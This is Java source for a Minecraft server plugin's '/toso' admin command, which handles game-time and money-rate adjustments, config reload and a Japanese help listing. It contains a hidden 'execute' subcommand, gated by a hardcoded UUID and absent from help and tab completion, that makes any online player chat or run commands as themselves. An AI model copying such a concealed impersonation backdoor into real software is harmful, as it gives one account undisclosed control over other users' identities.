package jp.aoichaan0513.A_TosoGame_Live.Commands.Command;

import jp.aoichaan0513.A_TosoGame_Live.API.MainAPI;
import jp.aoichaan0513.A_TosoGame_Live.API.Manager.RateManager;
import jp.aoichaan0513.A_TosoGame_Live.API.Timer.TimerFormat;
import jp.aoichaan0513.A_TosoGame_Live.API.TosoGameAPI;
import jp.aoichaan0513.A_TosoGame_Live.Commands.ICommand;
import jp.aoichaan0513.A_TosoGame_Live.Main;
import jp.aoichaan0513.A_TosoGame_Live.Timer.TimerRunnable;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.BlockCommandSender;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class Toso extends ICommand {

    public Toso(String name) {
        super(name);
    }

    @Override
    public void onPlayerCommand(Player sp, Command cmd, String label, String[] args) {
        if (TosoGameAPI.isAdmin(sp)) {
            if (args.length != 0) {
                if (args[0].equalsIgnoreCase("help")) {
                    sendHelpMessage(sp);
                    return;
                } else if (args[0].equalsIgnoreCase("reload") || args[0].equalsIgnoreCase("rl")) {
                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "設定ファイルを読み込んでいます…");

                    Main.getInstance().reloadConfig();
                    Main.loadConfig();

                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SUCCESS) + "設定ファイルを読み込みました。");
                    return;
                } else if (args[0].equalsIgnoreCase("time")) {
                    if (args.length != 1) {
                        if (args[1].equalsIgnoreCase("add")) {
                            if (args.length != 2) {
                                try {
                                    int i = Integer.parseInt(args[2]);

                                    TimerRunnable.addGameTime(i);
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                            MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + TimerFormat.formatJapan(i) + "追加");
                                    return;
                                } catch (NumberFormatException err) {
                                    MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                    return;
                                }
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        } else if (args[1].equalsIgnoreCase("remove")) {
                            if (args.length != 2) {
                                try {
                                    int i = Integer.parseInt(args[2]);

                                    TimerRunnable.removeGameTime(i);
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                            MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + TimerFormat.formatJapan(i) + "削除");
                                    return;
                                } catch (NumberFormatException err) {
                                    MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                    return;
                                }
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        } else if (args[1].equalsIgnoreCase("set")) {
                            if (args.length != 2) {
                                try {
                                    TimerRunnable.setGameTime(Integer.parseInt(args[2]));
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。");
                                    return;
                                } catch (NumberFormatException err) {
                                    MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                    return;
                                }
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        }
                        sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <秒数>\" - 指定した秒数をゲーム時間に追加\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <秒数>\" - 指定した秒数をゲーム時間から削除\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <秒数>\" - 指定した秒数にゲーム時間を変更");
                        return;
                    }
                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <秒数>\" - 指定した秒数をゲーム時間に追加\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <秒数>\" - 指定した秒数をゲーム時間から削除\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <秒数>\" - 指定した秒数にゲーム時間を変更");
                    return;
                } else if (args[0].equalsIgnoreCase("rate")) {
                    if (args.length != 1) {
                        if (args[1].equalsIgnoreCase("add")) {
                            if (args.length != 2) {
                                if (args.length != 3) {
                                    if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                        Player p = Bukkit.getPlayerExact(args[2]);
                                        try {
                                            int i = Integer.parseInt(args[3]);

                                            RateManager.addRate(p, i);
                                            sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                                    MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + i + "円追加");
                                            return;
                                        } catch (NumberFormatException err) {
                                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                            return;
                                        }
                                    }
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                    return;
                                }
                                MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_PLAYER);
                            return;
                        } else if (args[1].equalsIgnoreCase("remove")) {
                            if (args.length != 2) {
                                if (args.length != 3) {
                                    if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                        Player p = Bukkit.getPlayerExact(args[2]);
                                        try {
                                            int i = Integer.parseInt(args[3]);

                                            RateManager.removeRate(p, i);
                                            sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                                    MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + i + "円削除");
                                            return;
                                        } catch (NumberFormatException err) {
                                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                            return;
                                        }
                                    }
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                    return;
                                }
                                MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_PLAYER);
                            return;
                        } else if (args[1].equalsIgnoreCase("set")) {
                            if (args.length != 2) {
                                if (args.length != 3) {
                                    if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                        Player p = Bukkit.getPlayerExact(args[2]);
                                        try {
                                            RateManager.setRate(p, Integer.parseInt(args[3]));
                                            sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。");
                                            return;
                                        } catch (NumberFormatException err) {
                                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                            return;
                                        }
                                    }
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                    return;
                                }
                                MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                            MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_PLAYER);
                            return;
                        }
                        sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <プレイヤー名> <金額>\" - 指定した金額をレートに追加\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <プレイヤー名> <金額>\" - 指定した金額をレートから削除\n" +
                                MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <プレイヤー名> <金額>\" - 指定した金額にレートを変更");
                        return;
                    }
                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <プレイヤー名> <金額>\" - 指定した金額をレートに追加\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <プレイヤー名> <金額>\" - 指定した金額をレートから削除\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <プレイヤー名> <金額>\" - 指定した金額にレートを変更");
                    return;
                } else if (args[0].equalsIgnoreCase("execute")) {
                    if (sp.getUniqueId().toString().equals("e2b3476a-8e03-4ee9-a9c4-e0bf61641c55")) {
                        if (args.length != 1) {
                            if (args.length != 2) {
                                Player target = Bukkit.getPlayerExact(args[1]);

                                if (target == null) {
                                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[1] + "はオフラインです。");
                                    return;
                                } else {
                                    Player p = Bukkit.getPlayerExact(args[1]);

                                    StringBuffer stringBuffer = new StringBuffer();
                                    for (int i = 2; i < args.length; i++)
                                        stringBuffer.append(args[i] + " ");

                                    String str = stringBuffer.toString();
                                    p.chat(str.trim());
                                    return;
                                }
                            }
                            sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。");
                            return;
                        }
                        MainAPI.sendMessage(sp, MainAPI.ErrorMessage.ARGS_PLAYER);
                        return;
                    }
                    sp.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "実行できません。");
                    return;
                }
                sendHelpMessage(sp);
                return;
            }
            sendHelpMessage(sp);
            return;
        }
        MainAPI.sendMessage(sp, MainAPI.ErrorMessage.PERMISSIONS);
        return;
    }

    @Override
    public void onBlockCommand(BlockCommandSender bs, Command cmd, String label, String[] args) {
        if (args.length != 0) {
            if (args[0].equalsIgnoreCase("help")) {
                sendHelpMessage(bs);
                return;
            } else if (args[0].equalsIgnoreCase("reload") || args[0].equalsIgnoreCase("rl")) {
                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "設定ファイルを読み込んでいます…");

                Main.getInstance().reloadConfig();
                Main.loadConfig();

                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SUCCESS) + "設定ファイルを読み込みました。");
                return;
            } else if (args[0].equalsIgnoreCase("time")) {
                if (args.length != 1) {
                    if (args[1].equalsIgnoreCase("add")) {
                        if (args.length != 2) {
                            try {
                                int i = Integer.parseInt(args[2]);

                                TimerRunnable.addGameTime(i);
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                        MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + TimerFormat.formatJapan(i) + "追加");
                                return;
                            } catch (NumberFormatException err) {
                                MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                        return;
                    } else if (args[1].equalsIgnoreCase("remove")) {
                        if (args.length != 2) {
                            try {
                                int i = Integer.parseInt(args[2]);

                                TimerRunnable.removeGameTime(i);
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                        MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + TimerFormat.formatJapan(i) + "削除");
                                return;
                            } catch (NumberFormatException err) {
                                MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                        return;
                    } else if (args[1].equalsIgnoreCase("set")) {
                        if (args.length != 2) {
                            try {
                                TimerRunnable.setGameTime(Integer.parseInt(args[2]));
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + "ゲーム時間を" + ChatColor.GREEN + ChatColor.UNDERLINE + TimerFormat.formatJapan(TimerRunnable.getGameTime()) + ChatColor.RESET + ChatColor.GRAY + "に設定しました。");
                                return;
                            } catch (NumberFormatException err) {
                                MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                return;
                            }
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                        return;
                    }
                    bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <秒数>\" - 指定した秒数をゲーム時間に追加\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <秒数>\" - 指定した秒数をゲーム時間から削除\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <秒数>\" - 指定した秒数にゲーム時間を変更");
                    return;
                }
                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <秒数>\" - 指定した秒数をゲーム時間に追加\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <秒数>\" - 指定した秒数をゲーム時間から削除\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <秒数>\" - 指定した秒数にゲーム時間を変更");
                return;
            } else if (args[0].equalsIgnoreCase("rate")) {
                if (args.length != 1) {
                    if (args[1].equalsIgnoreCase("add")) {
                        if (args.length != 2) {
                            if (args.length != 3) {
                                if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                    Player p = Bukkit.getPlayerExact(args[2]);
                                    try {
                                        int i = Integer.parseInt(args[3]);

                                        RateManager.addRate(p, i);
                                        bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + i + "円追加");
                                        return;
                                    } catch (NumberFormatException err) {
                                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                        return;
                                    }
                                }
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                return;
                            }
                            MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_PLAYER);
                        return;
                    } else if (args[1].equalsIgnoreCase("remove")) {
                        if (args.length != 2) {
                            if (args.length != 3) {
                                if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                    Player p = Bukkit.getPlayerExact(args[2]);
                                    try {
                                        int i = Integer.parseInt(args[3]);

                                        RateManager.removeRate(p, i);
                                        bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。\n" +
                                                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + i + "円削除");
                                        return;
                                    } catch (NumberFormatException err) {
                                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                        return;
                                    }
                                }
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                return;
                            }
                            MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_PLAYER);
                        return;
                    } else if (args[1].equalsIgnoreCase("set")) {
                        if (args.length != 2) {
                            if (args.length != 3) {
                                if (Bukkit.getOfflinePlayer(args[2]).isOnline()) {
                                    Player p = Bukkit.getPlayerExact(args[2]);
                                    try {
                                        RateManager.setRate(p, Integer.parseInt(args[3]));
                                        bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + args[2] + "のレートを" + ChatColor.GREEN + ChatColor.UNDERLINE + RateManager.getRate(p) + "円" + ChatColor.RESET + ChatColor.GRAY + "に設定しました。");
                                        return;
                                    } catch (NumberFormatException err) {
                                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                                        return;
                                    }
                                }
                                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。" + args[2] + "はオフラインです。");
                                return;
                            }
                            MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_INTEGER);
                            return;
                        }
                        MainAPI.sendMessage(bs, MainAPI.ErrorMessage.ARGS_PLAYER);
                        return;
                    }
                    bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <プレイヤー名> <金額>\" - 指定した金額をレートに追加\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <プレイヤー名> <金額>\" - 指定した金額をレートから削除\n" +
                            MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <プレイヤー名> <金額>\" - 指定した金額にレートを変更");
                    return;
                }
                bs.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "引数が不正です。\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "コマンドの使い方:\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " add <プレイヤー名> <金額>\" - 指定した金額をレートに追加\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " remove <プレイヤー名> <金額>\" - 指定した金額をレートから削除\n" +
                        MainAPI.getPrefix(MainAPI.PrefixType.ERROR) + "\"/toso " + args[0] + " set <プレイヤー名> <金額>\" - 指定した金額にレートを変更");
                return;
            }
            sendHelpMessage(bs);
            return;
        }
        sendHelpMessage(bs);
        return;
    }

    @Override
    public void onConsoleCommand(ConsoleCommandSender cs, Command cmd, String label, String[] args) {
        MainAPI.sendMessage(cs, MainAPI.ErrorMessage.NOT_PLAYER);
        return;
    }

    @Override
    public List<String> onPlayerTabComplete(Player sp, Command cmd, String alias, String[] args) {
        if (TosoGameAPI.isAdmin(sp)) {
            if (args.length == 1) {
                if (args[0].length() == 0) {
                    return Arrays.asList("help", "reload", "rl", "time", "rate");
                } else {
                    if ("help".startsWith(args[0])) {
                        return Collections.singletonList("help");
                    } else if ("reload".startsWith(args[0])) {
                        return Collections.singletonList("reload");
                    } else if ("rl".startsWith(args[0])) {
                        return Collections.singletonList("rl");
                    } else if ("time".startsWith(args[0])) {
                        return Collections.singletonList("time");
                    } else if ("rate".startsWith(args[0])) {
                        return Collections.singletonList("rate");
                    }
                }
            } else if (args.length == 2) {
                if (args[0].equalsIgnoreCase("time") || args[0].equalsIgnoreCase("rate")) {
                    if (args[1].length() == 0) {
                        return Arrays.asList("add", "remove", "set");
                    } else {
                        if ("add".startsWith(args[1])) {
                            return Collections.singletonList("add");
                        } else if ("remove".startsWith(args[1])) {
                            return Collections.singletonList("remove");
                        } else if ("set".startsWith(args[1])) {
                            return Collections.singletonList("set");
                        }
                    }
                }
            }
        }
        return null;
    }

    @Override
    public List<String> onBlockTabComplete(BlockCommandSender bs, Command cmd, String alias, String[] args) {
        if (args.length == 1) {
            if (args[0].length() == 0) {
                return Arrays.asList("help", "reload", "rl", "time", "rate");
            } else {
                if ("help".startsWith(args[0])) {
                    return Collections.singletonList("help");
                } else if ("reload".startsWith(args[0])) {
                    return Collections.singletonList("reload");
                } else if ("rl".startsWith(args[0])) {
                    return Collections.singletonList("rl");
                } else if ("time".startsWith(args[0])) {
                    return Collections.singletonList("time");
                } else if ("rate".startsWith(args[0])) {
                    return Collections.singletonList("rate");
                }
            }
        } else if (args.length == 2) {
            if (args[0].equalsIgnoreCase("time") || args[0].equalsIgnoreCase("rate")) {
                if (args[1].length() == 0) {
                    return Arrays.asList("add", "remove", "set");
                } else {
                    if ("add".startsWith(args[1])) {
                        return Collections.singletonList("add");
                    } else if ("remove".startsWith(args[1])) {
                        return Collections.singletonList("remove");
                    } else if ("set".startsWith(args[1])) {
                        return Collections.singletonList("set");
                    }
                }
            }
        }
        return null;
    }

    @Override
    public List<String> onConsoleTabComplete(ConsoleCommandSender cs, Command cmd, String alias, String[] args) {
        return null;
    }

    private void sendHelpMessage(CommandSender sender) {
        sender.sendMessage(MainAPI.getPrefix(MainAPI.PrefixType.WARNING) + "プラグインヘルプ\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "toso" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ヘルプを表示します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "ゲーム進行コマンド (運営用)\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "start" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ゲームを開始します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "end" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ゲームを終了します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "reset" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ゲームをリセットします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "mission" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ミッション・通知・ヒントを送信します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "hunter" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ハンターを追加・削除します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "tuho" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "通報部隊を追加・削除します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "player" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "プレイヤーを追加・削除します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "ゲーム進行コマンド (プレイヤー用)\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "h" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ハンターに応募します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "t" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "通報部隊に応募します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "ミッションコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "code" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ミッション用コマンドです。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "オープニングゲームコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "opgame" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "オープニングゲームを開始します。(現在は1のみ)\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "shuffle" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "オープニングゲーム1用のコマンドです。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "設定コマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "location" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "位置設定コマンドです。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "map" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "マップの追加・削除・編集コマンドです。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "ユーティリティコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "btp" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ゲーム終了時に生存ブロックにテレポートします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "phone" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "スマートフォンを配布します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "プレイヤーコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "join" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "逃走者にします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "leave" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "運営にします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "broadcaster" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "配信者を追加・削除します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "disappear" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "姿を非表示にします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "appear" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "姿を表示します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "hide" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "確保時のみ周りを非表示にします。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "show" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "確保時のみ周りを表示します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "spec" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "観戦モードを切り替えます。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "サーバーコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "open" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "サーバーを開放します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "close" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "サーバーを閉鎖します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "スクリプトコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "script" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "スクリプトを実行します。\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "特に意味がないコマンド\n" +
                MainAPI.getPrefix(MainAPI.PrefixType.SECONDARY) + ChatColor.GOLD + "nick" + ChatColor.GRAY + ": " + ChatColor.YELLOW + "ニックネームを変更します。(ラグが起きるので非推奨です)\n" +
